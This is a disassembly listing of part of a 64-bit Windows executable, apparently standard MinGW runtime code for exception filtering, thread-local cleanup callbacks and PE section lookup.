   140002574:	48 8b 05 45 5b 00 00 	mov    0x5b45(%rip),%rax        # 0x1400080c0
   14000257b:	48 85 c0             	test   %rax,%rax
   14000257e:	74 29                	je     0x1400025a9
   140002580:	f2 0f 10 84 24 80 00 	movsd  0x80(%rsp),%xmm0
   140002587:	00 00 
   140002589:	66 0f 14 d3          	unpcklpd %xmm3,%xmm2
   14000258d:	89 4c 24 20          	mov    %ecx,0x20(%rsp)
   140002591:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   140002596:	48 89 54 24 28       	mov    %rdx,0x28(%rsp)
   14000259b:	0f 29 54 24 30       	movaps %xmm2,0x30(%rsp)
   1400025a0:	f2 0f 11 44 24 40    	movsd  %xmm0,0x40(%rsp)
   1400025a6:	ff d0                	call   *%rax
   1400025a8:	90                   	nop
   1400025a9:	48 83 c4 58          	add    $0x58,%rsp
   1400025ad:	c3                   	ret
   1400025ae:	66 90                	xchg   %ax,%ax
   1400025b0:	48 89 0d 09 5b 00 00 	mov    %rcx,0x5b09(%rip)        # 0x1400080c0
   1400025b7:	e9 24 0d 00 00       	jmp    0x1400032e0
   1400025bc:	90                   	nop
   1400025bd:	90                   	nop
   1400025be:	90                   	nop
   1400025bf:	90                   	nop
   1400025c0:	48 83 ec 38          	sub    $0x38,%rsp
   1400025c4:	48 8b 11             	mov    (%rcx),%rdx
   1400025c7:	8b 02                	mov    (%rdx),%eax
   1400025c9:	49 89 c8             	mov    %rcx,%r8
   1400025cc:	89 c1                	mov    %eax,%ecx
   1400025ce:	81 e1 ff ff ff 20    	and    $0x20ffffff,%ecx
   1400025d4:	81 f9 43 43 47 20    	cmp    $0x20474343,%ecx
   1400025da:	0f 84 90 00 00 00    	je     0x140002670
   1400025e0:	3d 96 00 00 c0       	cmp    $0xc0000096,%eax
   1400025e5:	77 52                	ja     0x140002639
   1400025e7:	3d 8b 00 00 c0       	cmp    $0xc000008b,%eax
   1400025ec:	76 62                	jbe    0x140002650
   1400025ee:	05 73 ff ff 3f       	add    $0x3fffff73,%eax
   1400025f3:	83 f8 09             	cmp    $0x9,%eax
   1400025f6:	77 6c                	ja     0x140002664
   1400025f8:	48 8d 15 61 2e 00 00 	lea    0x2e61(%rip),%rdx        # 0x140005460
   1400025ff:	48 63 04 82          	movslq (%rdx,%rax,4),%rax
   140002603:	48 01 d0             	add    %rdx,%rax
   140002606:	ff e0                	jmp    *%rax
   140002608:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
   14000260f:	00 
   140002610:	31 d2                	xor    %edx,%edx
   140002612:	b9 08 00 00 00       	mov    $0x8,%ecx
   140002617:	4c 89 44 24 28       	mov    %r8,0x28(%rsp)
   14000261c:	e8 97 0c 00 00       	call   0x1400032b8
   140002621:	4c 8b 44 24 28       	mov    0x28(%rsp),%r8
   140002626:	48 83 f8 01          	cmp    $0x1,%rax
   14000262a:	0f 84 44 01 00 00    	je     0x140002774
   140002630:	48 85 c0             	test   %rax,%rax
   140002633:	0f 85 07 01 00 00    	jne    0x140002740
   140002639:	48 8b 05 a0 5a 00 00 	mov    0x5aa0(%rip),%rax        # 0x1400080e0
   140002640:	48 85 c0             	test   %rax,%rax
   140002643:	74 3b                	je     0x140002680
   140002645:	4c 89 c1             	mov    %r8,%rcx
   140002648:	48 83 c4 38          	add    $0x38,%rsp
   14000264c:	48 ff e0             	rex.W jmp *%rax
   14000264f:	90                   	nop
   140002650:	3d 05 00 00 c0       	cmp    $0xc0000005,%eax
   140002655:	0f 84 ad 00 00 00    	je     0x140002708
   14000265b:	77 33                	ja     0x140002690
   14000265d:	3d 02 00 00 80       	cmp    $0x80000002,%eax
   140002662:	75 d5                	jne    0x140002639
   140002664:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
   140002669:	48 83 c4 38          	add    $0x38,%rsp
   14000266d:	c3                   	ret
   14000266e:	66 90                	xchg   %ax,%ax
   140002670:	f6 42 04 01          	testb  $0x1,0x4(%rdx)
   140002674:	0f 85 66 ff ff ff    	jne    0x1400025e0
   14000267a:	eb e8                	jmp    0x140002664
   14000267c:	0f 1f 40 00          	nopl   0x0(%rax)
   140002680:	31 c0                	xor    %eax,%eax
   140002682:	48 83 c4 38          	add    $0x38,%rsp
   140002686:	c3                   	ret
   140002687:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
   14000268e:	00 00 
   140002690:	3d 08 00 00 c0       	cmp    $0xc0000008,%eax
   140002695:	74 cd                	je     0x140002664
   140002697:	3d 1d 00 00 c0       	cmp    $0xc000001d,%eax
   14000269c:	75 9b                	jne    0x140002639
   14000269e:	31 d2                	xor    %edx,%edx
   1400026a0:	b9 04 00 00 00       	mov    $0x4,%ecx
   1400026a5:	4c 89 44 24 28       	mov    %r8,0x28(%rsp)
   1400026aa:	e8 09 0c 00 00       	call   0x1400032b8
   1400026af:	4c 8b 44 24 28       	mov    0x28(%rsp),%r8
   1400026b4:	48 83 f8 01          	cmp    $0x1,%rax
   1400026b8:	0f 84 a2 00 00 00    	je     0x140002760
   1400026be:	48 85 c0             	test   %rax,%rax
   1400026c1:	0f 84 72 ff ff ff    	je     0x140002639
   1400026c7:	b9 04 00 00 00       	mov    $0x4,%ecx
   1400026cc:	ff d0                	call   *%rax
   1400026ce:	eb 94                	jmp    0x140002664
   1400026d0:	31 d2                	xor    %edx,%edx
   1400026d2:	b9 08 00 00 00       	mov    $0x8,%ecx
   1400026d7:	4c 89 44 24 28       	mov    %r8,0x28(%rsp)
   1400026dc:	e8 d7 0b 00 00       	call   0x1400032b8
   1400026e1:	4c 8b 44 24 28       	mov    0x28(%rsp),%r8
   1400026e6:	48 83 f8 01          	cmp    $0x1,%rax
   1400026ea:	0f 85 40 ff ff ff    	jne    0x140002630
   1400026f0:	ba 01 00 00 00       	mov    $0x1,%edx
   1400026f5:	b9 08 00 00 00       	mov    $0x8,%ecx
   1400026fa:	e8 b9 0b 00 00       	call   0x1400032b8
   1400026ff:	e9 60 ff ff ff       	jmp    0x140002664
   140002704:	0f 1f 40 00          	nopl   0x0(%rax)
   140002708:	31 d2                	xor    %edx,%edx
   14000270a:	b9 0b 00 00 00       	mov    $0xb,%ecx
   14000270f:	4c 89 44 24 28       	mov    %r8,0x28(%rsp)
   140002714:	e8 9f 0b 00 00       	call   0x1400032b8
   140002719:	4c 8b 44 24 28       	mov    0x28(%rsp),%r8
   14000271e:	48 83 f8 01          	cmp    $0x1,%rax
   140002722:	74 28                	je     0x14000274c
   140002724:	48 85 c0             	test   %rax,%rax
   140002727:	0f 84 0c ff ff ff    	je     0x140002639
   14000272d:	b9 0b 00 00 00       	mov    $0xb,%ecx
   140002732:	ff d0                	call   *%rax
   140002734:	e9 2b ff ff ff       	jmp    0x140002664
   140002739:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
   140002740:	b9 08 00 00 00       	mov    $0x8,%ecx
   140002745:	ff d0                	call   *%rax
   140002747:	e9 18 ff ff ff       	jmp    0x140002664
   14000274c:	ba 01 00 00 00       	mov    $0x1,%edx
   140002751:	b9 0b 00 00 00       	mov    $0xb,%ecx
   140002756:	e8 5d 0b 00 00       	call   0x1400032b8
   14000275b:	e9 04 ff ff ff       	jmp    0x140002664
   140002760:	ba 01 00 00 00       	mov    $0x1,%edx
   140002765:	b9 04 00 00 00       	mov    $0x4,%ecx
   14000276a:	e8 49 0b 00 00       	call   0x1400032b8
   14000276f:	e9 f0 fe ff ff       	jmp    0x140002664
   140002774:	ba 01 00 00 00       	mov    $0x1,%edx
   140002779:	b9 08 00 00 00       	mov    $0x8,%ecx
   14000277e:	e8 35 0b 00 00       	call   0x1400032b8
   140002783:	e8 68 f8 ff ff       	call   0x140001ff0
   140002788:	e9 d7 fe ff ff       	jmp    0x140002664
   14000278d:	90                   	nop
   14000278e:	90                   	nop
   14000278f:	90                   	nop
   140002790:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
   140002797:	00 00 00 
   14000279a:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
   1400027a0:	48 83 ec 38          	sub    $0x38,%rsp
   1400027a4:	8b 05 5e 59 00 00    	mov    0x595e(%rip),%eax        # 0x140008108
   1400027aa:	89 4c 24 40          	mov    %ecx,0x40(%rsp)
   1400027ae:	48 89 54 24 48       	mov    %rdx,0x48(%rsp)
   1400027b3:	85 c0                	test   %eax,%eax
   1400027b5:	75 09                	jne    0x1400027c0
   1400027b7:	31 c0                	xor    %eax,%eax
   1400027b9:	48 83 c4 38          	add    $0x38,%rsp
   1400027bd:	c3                   	ret
   1400027be:	66 90                	xchg   %ax,%ax
   1400027c0:	ba 18 00 00 00       	mov    $0x18,%edx
   1400027c5:	b9 01 00 00 00       	mov    $0x1,%ecx
   1400027ca:	e8 29 0b 00 00       	call   0x1400032f8
   1400027cf:	48 85 c0             	test   %rax,%rax
   1400027d2:	74 49                	je     0x14000281d
   1400027d4:	44 8b 4c 24 40       	mov    0x40(%rsp),%r9d
   1400027d9:	4c 8b 44 24 48       	mov    0x48(%rsp),%r8
   1400027de:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
   1400027e3:	48 8d 0d 36 59 00 00 	lea    0x5936(%rip),%rcx        # 0x140008120
   1400027ea:	44 89 08             	mov    %r9d,(%rax)
   1400027ed:	4c 89 40 08          	mov    %r8,0x8(%rax)
   1400027f1:	ff 15 51 6c 00 00    	call   *0x6c51(%rip)        # 0x140009448
   1400027f7:	48 8b 15 02 59 00 00 	mov    0x5902(%rip),%rdx        # 0x140008100
   1400027fe:	48 8b 44 24 28       	mov    0x28(%rsp),%rax
   140002803:	48 8d 0d 16 59 00 00 	lea    0x5916(%rip),%rcx        # 0x140008120
   14000280a:	48 89 50 10          	mov    %rdx,0x10(%rax)
   14000280e:	48 89 05 eb 58 00 00 	mov    %rax,0x58eb(%rip)        # 0x140008100
   140002815:	ff 15 5d 6c 00 00    	call   *0x6c5d(%rip)        # 0x140009478
   14000281b:	eb 9a                	jmp    0x1400027b7
   14000281d:	83 c8 ff             	or     $0xffffffff,%eax
   140002820:	eb 97                	jmp    0x1400027b9
   140002822:	66 66 2e 0f 1f 84 00 	data16 cs nopw 0x0(%rax,%rax,1)
   140002829:	00 00 00 00 
   14000282d:	0f 1f 00             	nopl   (%rax)
   140002830:	48 83 ec 28          	sub    $0x28,%rsp
   140002834:	8b 05 ce 58 00 00    	mov    0x58ce(%rip),%eax        # 0x140008108
   14000283a:	89 4c 24 30          	mov    %ecx,0x30(%rsp)
   14000283e:	85 c0                	test   %eax,%eax
   140002840:	75 0e                	jne    0x140002850
   140002842:	31 c0                	xor    %eax,%eax
   140002844:	48 83 c4 28          	add    $0x28,%rsp
   140002848:	c3                   	ret
   140002849:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
   140002850:	48 8d 0d c9 58 00 00 	lea    0x58c9(%rip),%rcx        # 0x140008120
   140002857:	ff 15 eb 6b 00 00    	call   *0x6beb(%rip)        # 0x140009448
   14000285d:	48 8b 0d 9c 58 00 00 	mov    0x589c(%rip),%rcx        # 0x140008100
   140002864:	48 85 c9             	test   %rcx,%rcx
   140002867:	74 3a                	je     0x1400028a3
   140002869:	8b 54 24 30          	mov    0x30(%rsp),%edx
   14000286d:	45 31 c0             	xor    %r8d,%r8d
   140002870:	eb 19                	jmp    0x14000288b
   140002872:	66 66 2e 0f 1f 84 00 	data16 cs nopw 0x0(%rax,%rax,1)
   140002879:	00 00 00 00 
   14000287d:	0f 1f 00             	nopl   (%rax)
   140002880:	49 89 c8             	mov    %rcx,%r8
   140002883:	48 85 c0             	test   %rax,%rax
   140002886:	74 1b                	je     0x1400028a3
   140002888:	48 89 c1             	mov    %rax,%rcx
   14000288b:	8b 01                	mov    (%rcx),%eax
   14000288d:	39 d0                	cmp    %edx,%eax
   14000288f:	48 8b 41 10          	mov    0x10(%rcx),%rax
   140002893:	75 eb                	jne    0x140002880
   140002895:	4d 85 c0             	test   %r8,%r8
   140002898:	74 26                	je     0x1400028c0
   14000289a:	49 89 40 10          	mov    %rax,0x10(%r8)
   14000289e:	e8 5d 0a 00 00       	call   0x140003300
   1400028a3:	48 8d 0d 76 58 00 00 	lea    0x5876(%rip),%rcx        # 0x140008120
   1400028aa:	ff 15 c8 6b 00 00    	call   *0x6bc8(%rip)        # 0x140009478
   1400028b0:	31 c0                	xor    %eax,%eax
   1400028b2:	48 83 c4 28          	add    $0x28,%rsp
   1400028b6:	c3                   	ret
   1400028b7:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
   1400028be:	00 00 
   1400028c0:	48 89 05 39 58 00 00 	mov    %rax,0x5839(%rip)        # 0x140008100
   1400028c7:	eb d5                	jmp    0x14000289e
   1400028c9:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
   1400028d0:	41 57                	push   %r15
   1400028d2:	41 56                	push   %r14
   1400028d4:	57                   	push   %rdi
   1400028d5:	56                   	push   %rsi
   1400028d6:	53                   	push   %rbx
   1400028d7:	48 83 ec 30          	sub    $0x30,%rsp
   1400028db:	83 fa 02             	cmp    $0x2,%edx
   1400028de:	0f 84 2c 01 00 00    	je     0x140002a10
   1400028e4:	77 3a                	ja     0x140002920
   1400028e6:	85 d2                	test   %edx,%edx
   1400028e8:	0f 84 ba 00 00 00    	je     0x1400029a8
   1400028ee:	8b 05 14 58 00 00    	mov    0x5814(%rip),%eax        # 0x140008108
   1400028f4:	85 c0                	test   %eax,%eax
   1400028f6:	0f 84 94 01 00 00    	je     0x140002a90
   1400028fc:	c7 05 02 58 00 00 01 	movl   $0x1,0x5802(%rip)        # 0x140008108
   140002903:	00 00 00 
   140002906:	b8 01 00 00 00       	mov    $0x1,%eax
   14000290b:	48 83 c4 30          	add    $0x30,%rsp
   14000290f:	5b                   	pop    %rbx
   140002910:	5e                   	pop    %rsi
   140002911:	5f                   	pop    %rdi
   140002912:	41 5e                	pop    %r14
   140002914:	41 5f                	pop    %r15
   140002916:	c3                   	ret
   140002917:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
   14000291e:	00 00 
   140002920:	83 fa 03             	cmp    $0x3,%edx
   140002923:	75 e1                	jne    0x140002906
   140002925:	8b 05 dd 57 00 00    	mov    0x57dd(%rip),%eax        # 0x140008108
   14000292b:	85 c0                	test   %eax,%eax
   14000292d:	74 d7                	je     0x140002906
   14000292f:	48 8d 0d ea 57 00 00 	lea    0x57ea(%rip),%rcx        # 0x140008120
   140002936:	ff 15 0c 6b 00 00    	call   *0x6b0c(%rip)        # 0x140009448
   14000293c:	48 8b 1d bd 57 00 00 	mov    0x57bd(%rip),%rbx        # 0x140008100
   140002943:	48 85 db             	test   %rbx,%rbx
   140002946:	74 49                	je     0x140002991
   140002948:	48 8b 3d 59 6b 00 00 	mov    0x6b59(%rip),%rdi        # 0x1400094a8
   14000294f:	4c 8b 35 02 6b 00 00 	mov    0x6b02(%rip),%r14        # 0x140009458
   140002956:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
   14000295d:	00 00 00 
   140002960:	8b 0b                	mov    (%rbx),%ecx
   140002962:	ff d7                	call   *%rdi
   140002964:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
   140002969:	41 ff d6             	call   *%r14
   14000296c:	48 8b 4c 24 28       	mov    0x28(%rsp),%rcx
   140002971:	48 85 c9             	test   %rcx,%rcx
   140002974:	0f 84 3e 01 00 00    	je     0x140002ab8
   14000297a:	85 c0                	test   %eax,%eax
   14000297c:	0f 85 36 01 00 00    	jne    0x140002ab8
   140002982:	48 8b 43 08          	mov    0x8(%rbx),%rax
   140002986:	ff d0                	call   *%rax
   140002988:	48 8b 5b 10          	mov    0x10(%rbx),%rbx
   14000298c:	48 85 db             	test   %rbx,%rbx
   14000298f:	75 cf                	jne    0x140002960
   140002991:	48 8d 0d 88 57 00 00 	lea    0x5788(%rip),%rcx        # 0x140008120
   140002998:	ff 15 da 6a 00 00    	call   *0x6ada(%rip)        # 0x140009478
   14000299e:	e9 63 ff ff ff       	jmp    0x140002906
   1400029a3:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   1400029a8:	8b 05 5a 57 00 00    	mov    0x575a(%rip),%eax        # 0x140008108
   1400029ae:	85 c0                	test   %eax,%eax
   1400029b0:	75 6e                	jne    0x140002a20
   1400029b2:	8b 05 50 57 00 00    	mov    0x5750(%rip),%eax        # 0x140008108
   1400029b8:	83 f8 01             	cmp    $0x1,%eax
   1400029bb:	0f 85 45 ff ff ff    	jne    0x140002906
   1400029c1:	48 8b 1d 38 57 00 00 	mov    0x5738(%rip),%rbx        # 0x140008100
   1400029c8:	48 85 db             	test   %rbx,%rbx
   1400029cb:	74 14                	je     0x1400029e1
   1400029cd:	0f 1f 00             	nopl   (%rax)
   1400029d0:	48 89 d9             	mov    %rbx,%rcx
   1400029d3:	48 8b 5b 10          	mov    0x10(%rbx),%rbx
   1400029d7:	e8 24 09 00 00       	call   0x140003300
   1400029dc:	48 85 db             	test   %rbx,%rbx
   1400029df:	75 ef                	jne    0x1400029d0
   1400029e1:	48 8d 0d 38 57 00 00 	lea    0x5738(%rip),%rcx        # 0x140008120
   1400029e8:	48 c7 05 0d 57 00 00 	movq   $0x0,0x570d(%rip)        # 0x140008100
   1400029ef:	00 00 00 00 
   1400029f3:	c7 05 0b 57 00 00 00 	movl   $0x0,0x570b(%rip)        # 0x140008108
   1400029fa:	00 00 00 
   1400029fd:	ff 15 3d 6a 00 00    	call   *0x6a3d(%rip)        # 0x140009440
   140002a03:	e9 fe fe ff ff       	jmp    0x140002906
   140002a08:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
   140002a0f:	00 
   140002a10:	e8 db f5 ff ff       	call   0x140001ff0
   140002a15:	e9 ec fe ff ff       	jmp    0x140002906
   140002a1a:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
   140002a20:	48 8d 0d f9 56 00 00 	lea    0x56f9(%rip),%rcx        # 0x140008120
   140002a27:	ff 15 1b 6a 00 00    	call   *0x6a1b(%rip)        # 0x140009448
   140002a2d:	48 8b 1d cc 56 00 00 	mov    0x56cc(%rip),%rbx        # 0x140008100
   140002a34:	48 85 db             	test   %rbx,%rbx
   140002a37:	74 3c                	je     0x140002a75
   140002a39:	48 8b 3d 68 6a 00 00 	mov    0x6a68(%rip),%rdi        # 0x1400094a8
   140002a40:	4c 8b 35 11 6a 00 00 	mov    0x6a11(%rip),%r14        # 0x140009458
   140002a47:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
   140002a4e:	00 00 
   140002a50:	8b 0b                	mov    (%rbx),%ecx
   140002a52:	ff d7                	call   *%rdi
   140002a54:	48 89 c6             	mov    %rax,%rsi
   140002a57:	41 ff d6             	call   *%r14
   140002a5a:	85 c0                	test   %eax,%eax
   140002a5c:	75 4a                	jne    0x140002aa8
   140002a5e:	48 89 f1             	mov    %rsi,%rcx
   140002a61:	48 85 f6             	test   %rsi,%rsi
   140002a64:	74 42                	je     0x140002aa8
   140002a66:	48 8b 43 08          	mov    0x8(%rbx),%rax
   140002a6a:	ff d0                	call   *%rax
   140002a6c:	48 8b 5b 10          	mov    0x10(%rbx),%rbx
   140002a70:	48 85 db             	test   %rbx,%rbx
   140002a73:	75 db                	jne    0x140002a50
   140002a75:	48 8d 0d a4 56 00 00 	lea    0x56a4(%rip),%rcx        # 0x140008120
   140002a7c:	ff 15 f6 69 00 00    	call   *0x69f6(%rip)        # 0x140009478
   140002a82:	e9 2b ff ff ff       	jmp    0x1400029b2
   140002a87:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
   140002a8e:	00 00 
   140002a90:	48 8d 0d 89 56 00 00 	lea    0x5689(%rip),%rcx        # 0x140008120
   140002a97:	ff 15 cb 69 00 00    	call   *0x69cb(%rip)        # 0x140009468
   140002a9d:	e9 5a fe ff ff       	jmp    0x1400028fc
   140002aa2:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
   140002aa8:	48 8b 5b 10          	mov    0x10(%rbx),%rbx
   140002aac:	48 85 db             	test   %rbx,%rbx
   140002aaf:	75 9f                	jne    0x140002a50
   140002ab1:	eb c2                	jmp    0x140002a75
   140002ab3:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140002ab8:	48 8b 5b 10          	mov    0x10(%rbx),%rbx
   140002abc:	48 85 db             	test   %rbx,%rbx
   140002abf:	0f 85 9b fe ff ff    	jne    0x140002960
   140002ac5:	e9 c7 fe ff ff       	jmp    0x140002991
   140002aca:	90                   	nop
   140002acb:	90                   	nop
   140002acc:	90                   	nop
   140002acd:	90                   	nop
   140002ace:	90                   	nop
   140002acf:	90                   	nop
   140002ad0:	90                   	nop
   140002ad1:	90                   	nop
   140002ad2:	90                   	nop
   140002ad3:	90                   	nop
   140002ad4:	90                   	nop
   140002ad5:	90                   	nop
   140002ad6:	90                   	nop
   140002ad7:	90                   	nop
   140002ad8:	90                   	nop
   140002ad9:	90                   	nop
   140002ada:	90                   	nop
   140002adb:	90                   	nop
   140002adc:	90                   	nop
   140002add:	90                   	nop
   140002ade:	90                   	nop
   140002adf:	90                   	nop
   140002ae0:	31 c0                	xor    %eax,%eax
   140002ae2:	66 81 39 4d 5a       	cmpw   $0x5a4d,(%rcx)
   140002ae7:	75 0f                	jne    0x140002af8
   140002ae9:	48 63 51 3c          	movslq 0x3c(%rcx),%rdx
   140002aed:	48 01 d1             	add    %rdx,%rcx
   140002af0:	81 39 50 45 00 00    	cmpl   $0x4550,(%rcx)
   140002af6:	74 08                	je     0x140002b00
   140002af8:	c3                   	ret
   140002af9:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
   140002b00:	31 c0                	xor    %eax,%eax
   140002b02:	66 81 79 18 0b 02    	cmpw   $0x20b,0x18(%rcx)
   140002b08:	0f 94 c0             	sete   %al
   140002b0b:	c3                   	ret
   140002b0c:	0f 1f 40 00          	nopl   0x0(%rax)
   140002b10:	48 63 41 3c          	movslq 0x3c(%rcx),%rax
   140002b14:	48 01 c1             	add    %rax,%rcx
   140002b17:	44 0f b7 41 06       	movzwl 0x6(%rcx),%r8d
   140002b1c:	66 45 85 c0          	test   %r8w,%r8w
   140002b20:	74 3b                	je     0x140002b5d
   140002b22:	0f b7 41 14          	movzwl 0x14(%rcx),%eax
   140002b26:	48 8d 44 01 18       	lea    0x18(%rcx,%rax,1),%rax
   140002b2b:	41 8d 48 ff          	lea    -0x1(%r8),%ecx
   140002b2f:	48 8d 0c 89          	lea    (%rcx,%rcx,4),%rcx
   140002b33:	4c 8d 4c c8 28       	lea    0x28(%rax,%rcx,8),%r9
   140002b38:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
   140002b3f:	00 
   140002b40:	44 8b 40 0c          	mov    0xc(%rax),%r8d
   140002b44:	4c 89 c1             	mov    %r8,%rcx
   140002b47:	4c 39 c2             	cmp    %r8,%rdx
   140002b4a:	72 08                	jb     0x140002b54
   140002b4c:	03 48 08             	add    0x8(%rax),%ecx
   140002b4f:	48 39 ca             	cmp    %rcx,%rdx
   140002b52:	72 0b                	jb     0x140002b5f
   140002b54:	48 83 c0 28          	add    $0x28,%rax
   140002b58:	4c 39 c8             	cmp    %r9,%rax
   140002b5b:	75 e3                	jne    0x140002b40
   140002b5d:	31 c0                	xor    %eax,%eax
   140002b5f:	c3                   	ret
   140002b60:	57                   	push   %rdi
   140002b61:	56                   	push   %rsi
   140002b62:	53                   	push   %rbx
   140002b63:	48 83 ec 20          	sub    $0x20,%rsp
   140002b67:	48 89 ce             	mov    %rcx,%rsi
   140002b6a:	e8 61 06 00 00       	call   0x1400031d0
   140002b6f:	48 83 f8 08          	cmp    $0x8,%rax
   140002b73:	77 7b                	ja     0x140002bf0
   140002b75:	48 8b 15 64 29 00 00 	mov    0x2964(%rip),%rdx        # 0x1400054e0
   140002b7c:	31 db                	xor    %ebx,%ebx
   140002b7e:	66 81 3a 4d 5a       	cmpw   $0x5a4d,(%rdx)
   140002b83:	75 59                	jne    0x140002bde
   140002b85:	48 63 42 3c          	movslq 0x3c(%rdx),%rax
   140002b89:	48 01 d0             	add    %rdx,%rax
   140002b8c:	81 38 50 45 00 00    	cmpl   $0x4550,(%rax)
   140002b92:	75 4a                	jne    0x140002bde
   140002b94:	66 81 78 18 0b 02    	cmpw   $0x20b,0x18(%rax)
   140002b9a:	75 42                	jne    0x140002bde
   140002b9c:	0f b7 50 06          	movzwl 0x6(%rax),%edx
   140002ba0:	66 85 d2             	test   %dx,%dx
   140002ba3:	74 39                	je     0x140002bde
   140002ba5:	0f b7 48 14          	movzwl 0x14(%rax),%ecx
   140002ba9:	48 8d 5c 08 18       	lea    0x18(%rax,%rcx,1),%rbx
   140002bae:	8d 42 ff             	lea    -0x1(%rdx),%eax
   140002bb1:	48 8d 04 80          	lea    (%rax,%rax,4),%rax
   140002bb5:	48 8d 7c c3 28       	lea    0x28(%rbx,%rax,8),%rdi
   140002bba:	eb 0d                	jmp    0x140002bc9
   140002bbc:	0f 1f 40 00          	nopl   0x0(%rax)
   140002bc0:	48 83 c3 28          	add    $0x28,%rbx
   140002bc4:	48 39 fb             	cmp    %rdi,%rbx
   140002bc7:	74 27                	je     0x140002bf0
   140002bc9:	41 b8 08 00 00 00    	mov    $0x8,%r8d
   140002bcf:	48 89 f2             	mov    %rsi,%rdx
   140002bd2:	48 89 d9             	mov    %rbx,%rcx
   140002bd5:	e8 fe 05 00 00       	call   0x1400031d8
   140002bda:	85 c0                	test   %eax,%eax
   140002bdc:	75 e2                	jne    0x140002bc0
   140002bde:	48 89 d8             	mov    %rbx,%rax
   140002be1:	48 83 c4 20          	add    $0x20,%rsp
   140002be5:	5b                   	pop    %rbx
   140002be6:	5e                   	pop    %rsi
   140002be7:	5f                   	pop    %rdi
   140002be8:	c3                   	ret
   140002be9:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
   140002bf0:	31 db                	xor    %ebx,%ebx
   140002bf2:	48 89 d8             	mov    %rbx,%rax
   140002bf5:	48 83 c4 20          	add    $0x20,%rsp
   140002bf9:	5b                   	pop    %rbx
   140002bfa:	5e                   	pop    %rsi
   140002bfb:	5f                   	pop    %rdi
   140002bfc:	c3                   	ret
   140002bfd:	0f 1f 00             	nopl   (%rax)
   140002c00:	4c 8b 05 d9 28 00 00 	mov    0x28d9(%rip),%r8        # 0x1400054e0
   140002c07:	31 c0                	xor    %eax,%eax
   140002c09:	66 41 81 38 4d 5a    	cmpw   $0x5a4d,(%r8)
   140002c0f:	75 0f                	jne    0x140002c20
   140002c11:	49 63 50 3c          	movslq 0x3c(%r8),%rdx
   140002c15:	4c 01 c2             	add    %r8,%rdx
   140002c18:	81 3a 50 45 00 00    	cmpl   $0x4550,(%rdx)
   140002c1e:	74 08                	je     0x140002c28
   140002c20:	c3                   	ret
   140002c21:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
   140002c28:	66 81 7a 18 0b 02    	cmpw   $0x20b,0x18(%rdx)
   140002c2e:	75 f0                	jne    0x140002c20
   140002c30:	44 0f b7 4a 06       	movzwl 0x6(%rdx),%r9d
   140002c35:	66 45 85 c9          	test   %r9w,%r9w
   140002c39:	74 e5                	je     0x140002c20
   140002c3b:	0f b7 42 14          	movzwl 0x14(%rdx),%eax
   140002c3f:	4c 29 c1             	sub    %r8,%rcx
   140002c42:	48 8d 44 02 18       	lea    0x18(%rdx,%rax,1),%rax
   140002c47:	41 8d 51 ff          	lea    -0x1(%r9),%edx
   140002c4b:	48 8d 14 92          	lea    (%rdx,%rdx,4),%rdx
   140002c4f:	4c 8d 4c d0 28       	lea    0x28(%rax,%rdx,8),%r9
   140002c54:	66 66 2e 0f 1f 84 00 	data16 cs nopw 0x0(%rax,%rax,1)
   140002c5b:	00 00 00 00 
   140002c5f:	90                   	nop
   140002c60:	44 8b 40 0c          	mov    0xc(%rax),%r8d
   140002c64:	4c 89 c2             	mov    %r8,%rdx
   140002c67:	4c 39 c1             	cmp    %r8,%rcx
   140002c6a:	72 08                	jb     0x140002c74
   140002c6c:	03 50 08             	add    0x8(%rax),%edx
   140002c6f:	48 39 d1             	cmp    %rdx,%rcx
   140002c72:	72 ac                	jb     0x140002c20
   140002c74:	48 83 c0 28          	add    $0x28,%rax
   140002c78:	4c 39 c8             	cmp    %r9,%rax
   140002c7b:	75 e3                	jne    0x140002c60
   140002c7d:	31 c0                	xor    %eax,%eax
   140002c7f:	c3                   	ret
   140002c80:	48 8b 05 59 28 00 00 	mov    0x2859(%rip),%rax        # 0x1400054e0
   140002c87:	31 c9                	xor    %ecx,%ecx
   140002c89:	66 81 38 4d 5a       	cmpw   $0x5a4d,(%rax)
   140002c8e:	75 0f                	jne    0x140002c9f
   140002c90:	48 63 50 3c          	movslq 0x3c(%rax),%rdx
   140002c94:	48 01 d0             	add    %rdx,%rax
   140002c97:	81 38 50 45 00 00    	cmpl   $0x4550,(%rax)
   140002c9d:	74 09                	je     0x140002ca8
   140002c9f:	89 c8                	mov    %ecx,%eax
   140002ca1:	c3                   	ret
   140002ca2:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
   140002ca8:	66 81 78 18 0b 02    	cmpw   $0x20b,0x18(%rax)
   140002cae:	75 ef                	jne    0x140002c9f
   140002cb0:	0f b7 48 06          	movzwl 0x6(%rax),%ecx
   140002cb4:	89 c8                	mov    %ecx,%eax
   140002cb6:	c3                   	ret
   140002cb7:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
   140002cbe:	00 00 
   140002cc0:	4c 8b 05 19 28 00 00 	mov    0x2819(%rip),%r8        # 0x1400054e0
   140002cc7:	31 c0                	xor    %eax,%eax
